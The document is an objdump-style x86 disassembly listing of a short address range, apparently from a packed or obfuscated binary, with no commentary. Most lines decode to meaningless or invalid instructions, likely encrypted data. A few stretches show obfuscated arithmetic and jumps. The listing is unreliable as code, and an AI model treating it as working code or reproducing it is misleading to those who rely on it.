  4020e7:	(bad)  
  4020e8:	mov    ds:0xd31d5b4b,eax
  4020ed:	in     eax,0xf
  4020ef:	xchg   ch,al
  4020f1:	and    ecx,DWORD PTR [ecx+edi*2+0x2cd508c4]
  4020f8:	retf   0x7bf6
  4020fb:	ins    BYTE PTR es:[edi],dx
  4020fc:	fimul  WORD PTR [eax]
  4020fe:	adc    BYTE PTR [eax],cl
  402100:	lahf   
  402101:	(bad)  
  402102:	loopne 0x402133
  402104:	fwait
  402105:	adc    al,0x37
  402107:	jno    0x4020b3
  402109:	fs je  0x402144
  40210c:	cmp    BYTE PTR [ebp-0x17e5a578],al
  402112:	xlat   BYTE PTR ds:[ebx]
  402113:	mov    bl,0x5f
  402115:	cmc    
  402116:	jnp    0x402117
  402118:	push   es
  402119:	dec    eax
  40211a:	lock loopne 0x402198
  40211d:	(bad)  
  40211e:	mul    DWORD PTR [esp+ebp*1]
  402121:	mov    eax,0x7c63963a
  402126:	in     al,0x8b
  402128:	loopne 0x4020bb
  40212a:	dec    edi
  40212b:	mov    ah,0x69
  40212d:	cs xchg ebx,eax
  40212f:	(bad)  
  402130:	and    ebx,DWORD PTR [edi-0x6b]
  402133:	sub    BYTE PTR ds:0x3d52812e,bl
  402139:	dec    BYTE PTR [edx-0x1e5cd45e]
  40213f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  402141:	push   eax
  402142:	mov    esi,0xedc5f578
  402147:	mov    esp,0xfa5d576b
  40214c:	hlt    
  40214d:	nop
  40214e:	lahf   
  40214f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402150:	fsub   DWORD PTR cs:[edi+eax*1-0x43]
  402155:	ins    DWORD PTR es:[edi],dx
  402156:	xor    al,0x60
  402158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402159:	push   ecx
  40215a:	aam    0x81
  40215c:	mov    cl,0x54
  40215e:	mov    edi,0x8ab576d9
  402163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402164:	jmp    0x4021a6
  402166:	test   eax,0xd527453f
  40216b:	in     al,dx
  40216c:	jmp    0xaacd7479
  402171:	(bad)  
  402172:	(bad)  
  402173:	repz adc bl,dh
  402176:	(bad)  
  402177:	xchg   esi,eax
  402178:	jmp    0xb6e5:0xffe39934
  40217f:	(bad)  
  402180:	int3   
  402181:	cmp    ah,bl
  402183:	xchg   ebx,eax
  402184:	inc    esp
  402185:	div    DWORD PTR [edx]
  402187:	leave  
  402188:	push   ebx
  402189:	out    dx,al
  40218a:	adc    BYTE PTR [eax],ah
  40218c:	out    0x4e,eax
  40218e:	push   cs
  40218f:	jmp    0x85239f00
  402194:	add    BYTE PTR [ebx],ch
  402196:	pop    ds
  402197:	ffreep st(3)
  402199:	push   ds
  40219a:	sub    al,0xbc
  40219c:	fcmovb st,st(2)
  40219e:	mov    dh,0x34
  4021a0:	mov    al,0x52
  4021a2:	push   ss
  4021a3:	mov    ecx,edi
  4021a5:	stos   BYTE PTR es:[edi],al
  4021a6:	mov    cl,0xb2
  4021a8:	jo     0x4021a9
  4021aa:	inc    esp
  4021ab:	push   0x25
  4021ad:	fstp   DWORD PTR [edx]
  4021af:	out    dx,al
  4021b0:	cmp    eax,0x23f40c9f
  4021b5:	mov    esp,0xf6af35fa
  4021ba:	retf   
  4021bb:	jge    0x402212
  4021bd:	mov    edi,0x3eeac7cf
  4021c2:	and    DWORD PTR [ebp-0x1a04b6b3],ebx
  4021c8:	cmp    BYTE PTR [esi+0x5f],bl
  4021cb:	test   eax,0xe562380b
  4021d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021d1:	xchg   BYTE PTR [edi],bh
  4021d3:	mov    ds:0xfe674e6a,al
  4021d8:	fisub  DWORD PTR [ebp+0x63d39f26]
  4021de:	xor    BYTE PTR [ecx],0xd3
  4021e1:	cmp    BYTE PTR [edx+0x0],al
  4021e4:	stos   DWORD PTR es:[edi],eax
  4021e5:	loop   0x402225
  4021e7:	sub    al,0x4e
  4021e9:	push   edi
  4021ea:	hlt    
  4021eb:	inc    eax
  4021ec:	adc    DWORD PTR [ebp-0x739c1dff],esp
  4021f2:	(bad)  
  4021f4:	push   ecx
  4021f5:	aam    0x2c
  4021f7:	pop    ebx
  4021f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021f9:	scas   al,BYTE PTR es:[edi]
  4021fa:	mov    ch,0x40
  4021fc:	aaa    
  4021fd:	clc    
  4021fe:	xchg   ebx,eax
  4021ff:	out    0x67,al
  402201:	mov    al,ds:0x7444e605
  402206:	scas   eax,DWORD PTR es:[edi]
  402207:	adc    eax,0xc70321b1
  40220c:	(bad)
  402211:	ret    0x9d4a
  402214:	pop    edi
  402215:	xchg   ebp,eax
  402216:	adc    eax,0xc7c684c
  40221b:	aaa    
  40221c:	(bad)
  40221f:	or     BYTE PTR [esi],bh
  402221:	xchg   ecx,eax
  402222:	adc    ch,BYTE PTR [edx+0x3a]
  402225:	add    BYTE PTR [ebp+0x4e4e5704],cl
  40222b:	add    eax,0x268039c0
  402230:	dec    esp
  402231:	es pop ebx
  402234:	sti    
  402235:	dec    edi
  402236:	dec    ebx
  402237:	sub    esp,DWORD PTR [esi+0x4d2e9bed]
  40223d:	push   ss
  40223e:	lods   eax,DWORD PTR ds:[esi]
  40223f:	jnp    0x402217
  402241:	or     al,0x30
  402243:	sbb    BYTE PTR [ebp+0x0],ch
  402246:	inc    esi
  402247:	mov    ch,0x58
  402249:	fisttp QWORD PTR [esi-0x5a314764]
  40224f:	test   DWORD PTR [edx+0xc12a9d],ecx
  402255:	test   BYTE PTR [eax],dh
  402257:	dec    edx
  402258:	ins    DWORD PTR es:[edi],dx
  402259:	push   ecx
  40225a:	mov    ecx,0x6d2be0f3
  40225f:	imul   ebx,esp,0xffffff9c
  402262:	jmp    0x4021e9
  402264:	fcom   QWORD PTR [edx]
  402266:	pop    ecx
  402267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402268:	jbe    0x4022e9
  40226a:	scas   al,BYTE PTR es:[edi]
  40226b:	mov    eax,DWORD PTR [ecx]
  40226d:	ja     0x40228f
  40226f:	loopne 0x402242
  402271:	mov    bh,0x9c
  402273:	in     eax,0x91
  402275:	daa    
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ecx-0x6d],ebx
  40229c:	shl    DWORD PTR ds:0x70700270,0x70
  4022a3:	jle    0x402315
  4022a5:	jo     0x4022f9
  4022a7:	sbb    esp,0xb6695a8a
  4022ad:	int    0x26
  4022af:	add    DWORD PTR [eax-0x21],edx
  4022b2:	std    
  4022b3:	add    BYTE PTR [esi+0x7a6328f3],ch
  4022b9:	add    BYTE PTR [eax-0x4b00129a],bh
  4022bf:	outs   dx,BYTE PTR ds:[esi]
  4022c0:	das    
  4022c1:	or     edx,DWORD PTR [edx+0x12833e5a]
  4022c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022c8:	in     eax,0x5b
  4022ca:	mov    edx,0x290d2234
  4022cf:	cmp    dh,cl
  4022d1:	sub    edx,ebp
  4022d3:	loopne 0x4022a2
  4022d5:	hlt    
  4022d6:	mov    esi,DWORD PTR [edx+0x6]
  4022d9:	pusha  
  4022da:	fidivr DWORD PTR [edx-0x4761bd5b]
  4022e0:	je     0x402319
  4022e2:	mov    dh,0x72
  4022e4:	mov    esi,0xfb500320
  4022e9:	in     al,dx
  4022ea:	jbe    0x4022b1
  4022ec:	aad    0x9b
  4022ee:	loope  0x40234a
  4022f0:	stc    
  4022f1:	xchg   ebp,eax
  4022f2:	dec    edi
  4022f3:	adc    eax,0x8ddcaf29
  4022f8:	mov    ch,0xaf
  4022fa:	and    DWORD PTR [eax],0x77
  4022fd:	or     DWORD PTR [esi+0x78fe1ab6],eax
  402303:	(bad)  
  402304:	sbb    al,0x4
  402306:	outs   dx,DWORD PTR ds:[esi]
  402307:	xchg   ecx,eax
  402308:	inc    ecx
  402309:	jle    0x402334
  40230b:	cmp    esp,DWORD PTR [edx+eax*4+0x61]
  40230f:	ss push edx
  402311:	push   esi
  402312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402313:	mov    eax,ds:0x827e3d9
  402318:	loop   0x4022be
  40231a:	xchg   ebx,eax
  40231b:	scas   eax,DWORD PTR es:[edi]
  40231c:	in     eax,0x10
  40231e:	mov    WORD PTR ss:[esp+ebx*1-0x5ead990d],gs
  402326:	and    eax,0x18ac5777
  40232b:	add    al,0xf3
  40232d:	jmp    0x402389
  40232f:	ret    
  402330:	adc    edx,edi
  402332:	daa    
  402333:	cmp    BYTE PTR [ecx],0xd
  402336:	jge    0x402398
  402338:	bound  edi,QWORD PTR [eax+0x1767c6a4]
  40233e:	and    bh,cl
  402340:	les    ecx,FWORD PTR [ecx+0x23d891f8]
  402346:	push   esi
  402347:	xor    dh,BYTE PTR [edi]
  402349:	xchg   ebp,eax
  40234a:	xor    BYTE PTR [eax+edi*4+0x21],0xc
  40234f:	jnp    0x402382
  402351:	pop    ss
  402352:	and    al,0xdb
  402354:	adc    esi,ecx
  402356:	inc    edi
  402357:	or     BYTE PTR [ecx+0x33],dl
  40235a:	ss pop es
  40235c:	in     eax,dx
  40235d:	xor    al,0xea
  40235f:	mov    ch,0xd
  402361:	jp     0x402337
  402363:	call   0xb748:0x1f2a32b4
  40236a:	call   0x2ce8:0x93ba00ae
  402371:	push   ebx
  402372:	pop    esp
  402373:	inc    ecx
  402374:	int    0xc0
  402376:	adc    BYTE PTR [eax+0x2b],ch
  402379:	jo     0x402386
  40237b:	ret    0x8590
  40237e:	icebp  
  40237f:	mov    ah,0x2e
  402381:	sti    
  402382:	test   DWORD PTR [eax-0x68],edx
  402385:	jmp    0xddbe:0x579b31ff
  40238c:	inc    eax
  40238d:	aas    
  40238e:	icebp  
  40238f:	add    eax,0xd2a814d7
  402394:	int    0x2d
  402396:	xchg   ebx,eax
  402397:	and    bh,BYTE PTR [ebx]
  402399:	mov    DWORD PTR [eax],ecx
  40239b:	out    0x77,al
  40239d:	pop    ebp
  40239e:	mov    dh,0x1e
  4023a0:	sub    al,0xf1
  4023a2:	mov    eax,ds:0x98fd5a5e
  4023a7:	jp     0x402426
  4023a9:	fdivr  QWORD PTR [esi-0x4d]
  4023ac:	sti    
  4023ad:	loop   0x4023f9
  4023af:	pop    ebp
  4023b0:	inc    esp
  4023b1:	fwait
  4023b2:	mov    edx,0x39cf61e3
  4023b7:	aam    0x82
  4023b9:	ret    
  4023ba:	push   edi
  4023bb:	and    ch,cl
  4023bd:	cld    
  4023be:	leave  
  4023bf:	out    dx,eax
  4023c0:	dec    ebx
  4023c1:	xor    al,0xbf
  4023c3:	push   ebx
  4023c4:	in     al,dx
  4023c5:	aaa    
  4023c6:	lock jecxz 0x4023e4
  4023c9:	add    al,0xda
  4023cb:	jb     0x4023e9
  4023cd:	int3   
  4023ce:	mov    al,BYTE PTR [esi+edi*1]
  4023d1:	mov    edi,0x50bc7977
  4023d6:	ror    BYTE PTR [eax-0x4e2ea7fe],0xeb
  4023dd:	pop    ebp
  4023de:	and    eax,0x9cfaa59c
  4023e3:	sbb    DWORD PTR [eax-0x4c259e07],ebp
  4023e9:	jnp    0x4023fb
  4023eb:	shl    bl,1
  4023ed:	sub    eax,0x33092013
  4023f2:	hlt    
  4023f3:	mov    edi,DWORD PTR [edx+0x297f6b19]
  4023f9:	cmp    ch,al
  4023fb:	cdq    
  4023fc:	add    eax,0x4a1c6281
  402401:	add    al,0x21
  402403:	hlt    
  402404:	in     al,dx
  402405:	pop    ebp
  402406:	pop    ds
  402407:	popa   
  402408:	jg     0x4023b5
  40240a:	xor    esi,esp
  40240c:	es jb  0x402438
  40240f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402411:	(bad)  
  402412:	xchg   esi,eax
  402413:	shr    DWORD PTR [ebp+0x78bc6d70],cl
  402419:	push   ebp
  40241a:	xchg   ecx,eax
  40241b:	dec    ebx
  40241c:	push   ebx
  40241d:	pop    es
  40241e:	mov    es,WORD PTR ds:0xc62c3bf9
  402424:	mov    eax,DWORD PTR fs:0x717d8a3e
  40242b:	bnd jno 0x40240f
  40242e:	mov    ebp,0x8ff2d074
  402433:	addr16 adc edi,0x2d73c4d7
  40243a:	mov    esi,0x16779377
  40243f:	fldenv [edx+0x6a]
  402442:	frstor [ecx]
  402444:	fbstp  TBYTE PTR [esi]
  402446:	loop   0x4023d3
  402448:	in     eax,0x4
  40244a:	iretw  
  40244c:	gs out 0x5f,eax
  40244f:	push   esi
  402450:	in     al,dx
  402451:	jl     0x402471
  402453:	mov    dl,0xea
  402455:	add    eax,0xcfa71bf7
  40245a:	lock jecxz 0x4024cd
  40245d:	cmp    BYTE PTR [ebp-0x10],al
  402460:	addr16 das 
  402462:	fmul   QWORD PTR [ebp-0x12]
  402465:	cwde   
  402466:	mov    edi,0xa031b59d
  40246b:	jle    0x4024e2
  40246d:	(bad)  
  40246f:	mov    ch,0x84
  402471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402472:	dec    esi
  402473:	sbb    eax,0xab668a7e
  402478:	je     0x40243c
  40247a:	and    DWORD PTR [si-0x63f8],esi
  40247f:	or     ah,BYTE PTR [eax]
  402481:	add    eax,0x88a86b28
  402486:	popa   
  402487:	mov    dh,0xc1
  402489:	pop    ss
  40248a:	js     0x402463
  40248c:	xchg   edi,eax
  40248d:	add    al,0x4c
  40248f:	ins    BYTE PTR es:[edi],dx
  402490:	cld    
  402491:	stos   BYTE PTR es:[edi],al
  402492:	sub    eax,0x504ba46f
  402497:	mov    edi,0xb15f0923
  40249c:	mov    edi,0xc06d1675
  4024a1:	mov    ah,0x57
  4024a3:	out    0x6,al
  4024a5:	mul    DWORD PTR [esi-0x75]
  4024a8:	push   ebp
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x9f8d3c9],cl
  4024f4:	and    DWORD PTR [eax+0x0],esi
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	loop   0x402509
  4024ff:	lahf   
  402500:	jp     0x402512
  402502:	xor    al,0xfc
  402504:	jecxz  0x40249a
  402506:	adc    ebx,DWORD PTR [edx+0x4e]
  402509:	xchg   DWORD PTR [edx],esp
  40250b:	dec    esi
  40250c:	std    
  40250d:	inc    edi
  40250e:	pop    ebp
  40250f:	(bad)  
  402510:	int    0x4b
  402512:	out    0x1a,eax
  402514:	das    
  402515:	or     esi,ecx
  402517:	jl     0x40255f
  402519:	shl    BYTE PTR ds:0xf9f16514,cl
  40251f:	mov    ch,BYTE PTR [edx-0x6c]
  402522:	popf   
  402523:	jbe    0x402592
  402525:	pop    edi
  402526:	(bad)
  402529:	sub    DWORD PTR [edi-0x4],ebx
  40252c:	xor    eax,0x3d067592
  402531:	lahf   
  402532:	mov    dl,0xf0
  402534:	gs pop ss
  402536:	sub    eax,0x2c579224
  40253b:	xchg   edx,eax
  40253c:	mov    dh,BYTE PTR [ecx+0x1c]
  40253f:	push   edx
  402540:	and    al,0x81
  402542:	mov    esi,0xa0d29b54
  402547:	out    0xc7,eax
  402549:	(bad)  
  40254a:	fstp   QWORD PTR [ecx+0x180369dd]
  402550:	sbb    BYTE PTR [edx-0x33c75aa1],bh
  402556:	(bad)  
  402557:	jg     0x4025ca
  402559:	mov    ch,0x64
  40255b:	pop    edi
  40255c:	or     ah,BYTE PTR [eax]
  40255e:	test   DWORD PTR [eax+0x6f],edi
  402561:	mov    dl,0x1f
  402563:	jmp    0x660b9750
  402568:	sahf   
  402569:	test   eax,0xc97026a0
  40256e:	cmp    DWORD PTR [ecx+ebx*4+0x23],ecx
  402572:	test   edi,edx
  402574:	cmp    eax,DWORD PTR [esp+edx*4]
  402577:	pusha  
  402578:	inc    esi
  402579:	jge    0x4025b1
  40257b:	and    BYTE PTR [ebx-0x5b],ah
  40257e:	test   DWORD PTR [ebp-0x25],ecx
  402581:	sub    BYTE PTR [ecx+0x4b],0xa
  402585:	cmp    ch,BYTE PTR fs:[edi-0x3ef55cea]
  40258c:	sub    ebp,edi
  40258e:	sub    DWORD PTR [esi-0x4a],eax
  402591:	outs   dx,DWORD PTR ds:[esi]
  402592:	fadd   st(4),st
  402594:	or     BYTE PTR [ebp-0x331b1b29],dl
  40259a:	sahf   
  40259b:	inc    ebx
  40259c:	rcr    DWORD PTR [ebx+esi*4-0x5f],cl
  4025a0:	jnp    0x4025df
  4025a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a3:	jne    0x40261a
  4025a5:	pop    eax
  4025a6:	push   0x5a094237
  4025ab:	cmp    eax,0xe4e42e1a
  4025b0:	push   ecx
  4025b1:	imul   esi,esp,0x8b249e14
  4025b7:	sbb    BYTE PTR [edi+0xa872571],dl
  4025bd:	das    
  4025be:	mov    dh,0xb3
  4025c0:	popf   
  4025c1:	fdiv   DWORD PTR [ebx+0x3c3df84]
  4025c7:	jb     0x402640
  4025c9:	stos   DWORD PTR es:[edi],eax
  4025ca:	mov    eax,ds:0x9725b2f2
  4025cf:	xchg   al,al
  4025d1:	inc    edi
  4025d2:	(bad)  
  4025d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025d5:	inc    ebx
  4025d6:	inc    ebp
  4025d7:	hlt    
  4025d8:	cld    
  4025d9:	jae    0x4025c3
  4025db:	jne    0x402646
  4025dd:	test   BYTE PTR [ebx],ch
  4025df:	mov    ch,0xe8
  4025e1:	jo     0x4025b2
  4025e3:	out    0xfb,eax
  4025e5:	scas   eax,DWORD PTR es:[edi]
  4025e6:	repz sbb eax,0x70029f83
  4025ec:	jge    0x4025f4
  4025ee:	jae    0x402602
  4025f0:	fpatan 
  4025f2:	or     DWORD PTR [ecx],eax
  4025f4:	aam    0xec
  4025f6:	pop    eax
  4025f7:	inc    edi
  4025f8:	jmp    0x3658:0xefbda949
  4025ff:	pop    ecx
  402600:	mov    ch,BYTE PTR [edi-0x41]
  402603:	dec    eax
  402604:	jg     0x402669
  402606:	int3   
  402607:	push   ebp
  402608:	xadd   DWORD PTR [edx-0xb],eax
  40260c:	ficom  DWORD PTR [edx-0x6fbbc3b1]
  402612:	jle    0x402675
  402614:	or     DWORD PTR [esi-0x50c56dc6],esi
  40261a:	mov    dh,0x78
  40261c:	mov    bl,0x69
  40261e:	pop    edx
  40261f:	loop   0x402680
  402621:	pop    ebp
  402622:	(bad)  
  402623:	mov    DWORD PTR [ecx+0x62],esp
  402626:	cld    
  402627:	scas   al,BYTE PTR es:[edi]
  402628:	loope  0x402637
  40262a:	shl    BYTE PTR [ebx],0xa
  40262d:	push   ss
  40262e:	sub    ebp,DWORD PTR [ebp-0x26]
  402631:	sahf   
  402632:	and    edi,DWORD PTR [ecx-0x7d]
  402635:	popf   
  402636:	inc    eax
  402637:	out    dx,al
  402638:	das    
  402639:	repz es xchg edi,eax
  40263c:	js     0x402626
  40263e:	and    DWORD PTR [ebx],esp
  402640:	ja     0x402661
  402642:	xor    BYTE PTR [ecx],cl
  402644:	mov    cs,edi
  402646:	daa    
  402647:	pop    eax
  402648:	ds jle 0x4026a2
  40264b:	cli    
  40264c:	mov    ds:0x266df026,al
  402651:	sub    BYTE PTR [edx-0x37b9833e],ch
  402657:	mov    edi,0xec5496c
  40265c:	hlt    
  40265d:	cdq    
  40265e:	ret    0x3be0
  402661:	xchg   esi,eax
  402662:	mov    bl,0xac
  402664:	bound  ebx,QWORD PTR [ecx-0x79]
  402667:	xchg   ebp,eax
  402668:	jns    0x402606
  40266a:	adc    ecx,eax
  40266c:	lods   al,BYTE PTR ds:[esi]
  40266d:	sbb    bh,0xb4
  402670:	jl     0x402645
  402672:	push   eax
  402673:	cdq    
  402674:	add    al,0x58
  402676:	clc    
  402677:	mov    esp,0x3db1b36f
  40267c:	rcl    ebp,1
  40267e:	mov    cl,0x6b
  402680:	mov    ah,0xa
  402682:	enter  0x27e8,0x69
  402686:	xor    ecx,ebx
  402688:	dec    ebx
  402689:	sub    dh,dh
  40268b:	dec    esi
  40268c:	xor    bl,al
  40268e:	sbb    dh,BYTE PTR [ebp+0x2ecae0a5]
  402694:	sbb    DWORD PTR [esi-0x77071cd4],esp
  40269a:	adc    BYTE PTR [esi-0x3b],dl
  40269d:	iret   
  40269e:	push   esi
  40269f:	xor    BYTE PTR [ebp-0x3],ah
  4026a2:	add    DWORD PTR [ebp-0x4b8ebf7e],0x5e466798
  4026ac:	fcmovbe st,st(1)
  4026ae:	add    DWORD PTR [eax+edi*1],esp
  4026b1:	jno    0x40270b
  4026b3:	lds    esi,FWORD PTR [esi-0xd]
  4026b6:	push   esi
  4026b7:	frstor [edx-0x53cacd16]
  4026bd:	pop    dx
  4026bf:	jbe    0x4026a9
  4026c1:	imul   esi,DWORD PTR [edx+edi*2],0x84146af
  4026c8:	ins    BYTE PTR es:[edi],dx
  4026c9:	lods   al,BYTE PTR ds:[esi]
  4026ca:	and    al,0x83
  4026cc:	jae    0x4026fd
  4026ce:	sub    esp,DWORD PTR [eax-0x4885b976]
  4026d4:	(bad)  
  4026d5:	cmp    BYTE PTR [bx+0x70c5],cl
  4026da:	lods   eax,DWORD PTR ds:[esi]
  4026db:	mov    BYTE PTR [eax],ah
  4026dd:	rcl    dl,cl
  4026df:	jnp    0x40275b
  4026e1:	rcl    DWORD PTR [ebp-0x39],cl
  4026e4:	sub    al,0x5c
  4026e6:	mov    fs,ecx
  4026e8:	rcl    BYTE PTR [edx],cl
  4026ea:	add    eax,DWORD PTR [edx+0x14]
  4026ed:	mov    esp,0x3f6c9dc2
  4026f2:	sahf   
  4026f3:	jg     0x4026bd
  4026f5:	aas    
  4026f6:	pop    ds
  4026f7:	loop   0x4026b5
  4026f9:	xlat   BYTE PTR ds:[ebx]
  4026fa:	dec    ebx
  4026fb:	push   esp
  4026fc:	mov    dl,0x8b
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xb18a621b
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	mov    eax,0x19f35622
  40276c:	in     eax,dx
  40276d:	push   ebp
  40276e:	pop    ebp
  40276f:	push   ds
  402770:	push   esp
  402771:	push   esp
  402772:	mov    DWORD PTR es:[edx+0x73],esp
  402776:	mov    cl,0x3b
  402778:	les    ebp,FWORD PTR [edi-0x52]
  40277b:	mov    edi,0x91921f48
  402780:	xor    eax,0xe14e95a3
  402785:	repz mov edx,ebp
  402788:	jnp    0x4027ce
  40278a:	jo     0x40279c
  40278c:	lods   al,BYTE PTR ds:[esi]
  40278d:	lock push 0xffffffcc
  402790:	(bad)  
  402791:	sbb    eax,0xbc9d0feb
  402796:	stos   DWORD PTR es:[edi],eax
  402797:	ja     0x4027e5
  402799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40279a:	jnp    0x4027e2
  40279c:	out    0x92,al
  40279e:	pop    esi
  40279f:	jnp    0x402775
  4027a1:	jo     0x402750
  4027a3:	jmp    0x42b12dfd
  4027a8:	add    esp,edx
  4027aa:	dec    esi
  4027ab:	cmc    
  4027ac:	loop   0x40281c
  4027ae:	out    dx,eax
  4027af:	adc    ebp,eax
  4027b1:	cmp    eax,0x32ea0408
  4027b6:	mov    ch,0x13
  4027b8:	sbb    ebx,DWORD PTR [eax-0x4a586b5b]
  4027be:	frstor [ebx+0x19]
  4027c1:	inc    ecx
  4027c2:	pushf  
  4027c3:	lea    ebx,[esi]
  4027c5:	nop
  4027c6:	mov    al,0xb1
  4027c8:	ins    BYTE PTR es:[edi],dx
  4027c9:	mov    eax,ds:0x513189a6
  4027ce:	xor    eax,0x4d7b5c4d
  4027d3:	and    bh,0x5d
  4027d6:	bound  edx,QWORD PTR [ebx+0x216e2030]
  4027dc:	in     al,0x63
  4027de:	stc    
  4027df:	mov    bl,0x7c
  4027e1:	sti    
  4027e2:	dec    edx
  4027e3:	out    0xe9,eax
  4027e5:	pusha  
  4027e6:	cmp    eax,0xb1ca79af
  4027eb:	dec    eax
  4027ec:	iret   
  4027ed:	ret    
  4027ee:	in     al,dx
  4027ef:	clc    
  4027f0:	jno    0x40281b
  4027f2:	jp     0x402864
  4027f4:	ret    0xe961
  4027f7:	xchg   ecx,eax
  4027f8:	sar    BYTE PTR [eax],cl
  4027fa:	mov    ah,0xf2
  4027fc:	imul   ebp,DWORD PTR [ebp+0x228ec4f8],0x57
  402803:	fsub   st(0),st
  402805:	iret   
  402806:	data16 ficom DWORD PTR [edx]
  402809:	jg     0x4027cb
  40280b:	xor    eax,0x6ae10000
  402810:	mov    ebx,0xd8f177ee
  402815:	jp     0x4027b4
  402817:	jo     0x402849
  402819:	js     0x4027cb
  40281b:	scas   eax,DWORD PTR es:[edi]
  40281c:	aad    0xfd
  40281e:	and    DWORD PTR [ebx+0x2e0e686e],esi
  402824:	cdq    
  402825:	sbb    eax,0x8b043896
  40282a:	inc    ebp
  40282b:	mov    ?,edx
  40282d:	xchg   esp,eax
  40282e:	repnz ds cdq 
  402831:	cmp    DWORD PTR [eax+0x6213acbe],esp
  402837:	jo     0x402896
  402839:	jl     0x402896
  40283b:	outs   dx,BYTE PTR ss:[esi]
  40283d:	push   edi
  40283e:	daa    
  40283f:	fist   DWORD PTR [edi]
  402841:	inc    edx
  402842:	ss pop ebx
  402844:	aam    0xa7
  402846:	lods   al,BYTE PTR ds:[esi]
  402847:	ds popf 
  402849:	sbb    al,0x4e
  40284b:	mov    WORD PTR [eax],cs
  40284d:	mov    ah,0x2f
  40284f:	push   es
  402850:	sar    BYTE PTR [eax-0x61],cl
  402853:	cwde   
  402854:	adc    DWORD PTR [esi-0x5f],esp
  402857:	div    ch
  402859:	xchg   ebp,eax
  40285a:	icebp  
  40285b:	mov    dh,0xf
  40285d:	jae    0x4028ab
  40285f:	es ds in al,0x9c
  402863:	pop    eax
  402864:	aas    
  402865:	cmc    
  402866:	mov    edi,0xe824e84e
  40286b:	fidiv  DWORD PTR [edi-0xa]
  40286e:	or     eax,0x5c69bb21
  402873:	add    eax,0xc7abecc4
  402878:	mov    edi,0xda3fe1b3
  40287d:	push   ebp
  40287e:	pop    DWORD PTR [eax+0x183da332]
  402884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402885:	xor    DWORD PTR [eax+0x6b8a11d4],ebx
  40288b:	xlat   BYTE PTR ds:[ebx]
  40288c:	dec    eax
  40288d:	out    dx,eax
  40288e:	cmp    eax,0x5316b24a
  402893:	sbb    eax,0x87297180
  402898:	daa    
  402899:	jns    0x4028a1
  40289b:	mov    al,ds:0x3c9efb6f
  4028a0:	imul   ecx,esp,0x74
  4028a3:	ja     0x402882
  4028a5:	leave  
  4028a6:	ins    DWORD PTR es:[edi],dx
  4028a7:	cmp    ch,dl
  4028a9:	add    BYTE PTR [eax-0x56],al
  4028ac:	mov    edi,0x75d1113b
  4028b1:	popf   
  4028b2:	pop    edx
  4028b3:	mov    ecx,0xeffa8001
  4028b8:	mov    eax,0xfbe55d1f
  4028bd:	nop
  4028be:	jb     0x402898
  4028c0:	arpl   WORD PTR [ebp-0x52e2ee5a],bx
  4028c6:	mov    ds:0xd6c27ceb,al
  4028cb:	data16 cmp al,0xb3
  4028ce:	jge    0x40291d
  4028d0:	mov    ah,0x52
  4028d2:	mov    ebx,0x13fe4e89
  4028d7:	jg     0x402872
  4028d9:	cmp    al,0xe7
  4028db:	leave  
